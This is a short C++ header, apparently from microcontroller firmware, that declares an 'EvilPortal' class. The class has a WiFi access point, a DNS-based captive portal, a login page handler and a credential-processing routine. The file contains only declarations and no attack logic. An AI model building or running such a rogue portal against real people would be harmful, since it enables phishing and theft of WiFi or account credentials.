#ifndef EVILPORTAL_H
#define EVILPORTAL_H

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <map>
#include "helpers/buttons.h"
#include "helpers/print.h"
#include "helpers/files.h"
#include "modules/resources/Messages.h"

class EvilPortal {
    public:
        static void Start();

    private:
        static WiFiClass WiFi;
        static DNSServer dnsServer;
        static WebServer webServer;
        static IPAddress apGateway;

        static String htmlPage;
        static String SSID;

        static void setupAccessPoint();
        static void setupCaptivePortal();
        static void defaultHTML();
        static void processCredentials();
        static void handleLogin();
};

#endif // EVILPORTAL_H
